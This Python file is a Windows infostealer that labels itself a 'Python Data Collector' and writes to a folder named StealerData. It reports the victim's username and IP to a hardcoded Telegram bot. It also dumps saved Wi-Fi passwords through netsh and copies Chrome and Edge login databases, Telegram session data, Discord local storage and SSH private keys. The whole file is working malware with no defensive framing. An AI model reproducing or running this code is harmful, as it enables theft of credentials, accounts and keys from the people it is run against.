# ============================================================
# main.py - Python Data Collector
# ============================================================

import os
import sys
import json
import sqlite3
import shutil
import winreg
import subprocess
import platform
import socket
import getpass
import requests
from datetime import datetime
from pathlib import Path

# ========== CONFIG ==========
TOKEN = "8528053368:AAF5faIvI90mjkViQ-CY9Lo-nAjyjiWP6lY"
CHAT_ID = "8516763046"
OUTPUT_DIR = "C:\\StealerData"

os.makedirs(OUTPUT_DIR, exist_ok=True)

# ========== TELEGRAM ==========
def send_message(text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=30)
    except:
        pass

def send_file(filepath):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        with open(filepath, 'rb') as f:
            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
    except:
        pass

# ========== SYSTEM INFO ==========
def collect_system_info():
    info = {
        "user": getpass.getuser(),
        "hostname": socket.gethostname(),
        "os": platform.system() + " " + platform.release(),
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        info["ip"] = requests.get('https://api.ipify.org', timeout=5).text.strip()
    except:
        info["ip"] = "Unknown"
    
    with open(f"{OUTPUT_DIR}\\system.json", 'w') as f:
        json.dump(info, f)
    
    send_message(f"🚀 STEALER ACTIVE\nUser: {info['user']}\nIP: {info['ip']}")

# ========== REGISTRY ==========
def collect_registry():
    paths = [
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
        r"Software\Microsoft\Terminal Server Client\Default"
    ]
    data = {}
    for path in paths:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_READ)
            i = 0
            values = {}
            while True:
                try:
                    name, val, _ = winreg.EnumValue(key, i)
                    values[name] = str(val)
                    i += 1
                except:
                    break
            data[path] = values
        except:
            pass
    with open(f"{OUTPUT_DIR}\\registry.json", 'w') as f:
        json.dump(data, f)

# ========== PROCESSES ==========
def collect_processes():
    result = subprocess.run(['tasklist', '/fo', 'csv'], capture_output=True, text=True)
    with open(f"{OUTPUT_DIR}\\processes.csv", 'w') as f:
        f.write(result.stdout)

# ========== WIFI PASSWORDS ==========
def collect_wifi():
    result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
    profiles = []
    for line in result.stdout.split('\n'):
        if 'All User Profile' in line:
            profiles.append(line.split(':')[1].strip())
    
    wifi_data = []
    for profile in profiles:
        r = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], 
                          capture_output=True, text=True)
        for line in r.stdout.split('\n'):
            if 'Key Content' in line:
                wifi_data.append(f"{profile}: {line.split(':')[1].strip()}")
                break
    
    with open(f"{OUTPUT_DIR}\\wifi.txt", 'w') as f:
        f.write("\n".join(wifi_data))

# ========== BROWSER DATA ==========
def collect_browser():
    local = os.environ['LOCALAPPDATA']
    browsers = {
        "Chrome": f"{local}\\Google\\Chrome\\User Data",
        "Edge": f"{local}\\Microsoft\\Edge\\User Data"
    }
    
    browser_dir = f"{OUTPUT_DIR}\\browsers"
    os.makedirs(browser_dir, exist_ok=True)
    
    for name, path in browsers.items():
        if os.path.exists(path):
            login_db = f"{path}\\Default\\Login Data"
            if os.path.exists(login_db):
                shutil.copy2(login_db, f"{browser_dir}\\{name}_Login.db")

# ========== MESSENGER DATA ==========
def collect_messenger():
    appdata = os.environ['APPDATA']
    messengers = {
        "Telegram": f"{appdata}\\Telegram Desktop\\tdata",
        "Discord": f"{appdata}\\discord\\Local Storage\\leveldb"
    }
    
    msg_dir = f"{OUTPUT_DIR}\\messengers"
    os.makedirs(msg_dir, exist_ok=True)
    
    for name, path in messengers.items():
        if os.path.exists(path):
            dest = f"{msg_dir}\\{name}"
            if os.path.isdir(path):
                shutil.copytree(path, dest, dirs_exist_ok=True)
            else:
                shutil.copy2(path, dest)

# ========== SSH KEYS ==========
def collect_ssh():
    ssh_dir = os.path.expanduser("~/.ssh")
    if os.path.exists(ssh_dir):
        shutil.copytree(ssh_dir, f"{OUTPUT_DIR}\\ssh_keys", dirs_exist_ok=True)

# ========== MAIN ==========
def main():
    print("[*] Starting Python collector...")
    collect_system_info()
    collect_registry()
    collect_processes()
    collect_wifi()
    collect_browser()
    collect_messenger()
    collect_ssh()
    print("[+] Python collector done!")

if __name__ == "__main__":
    main()
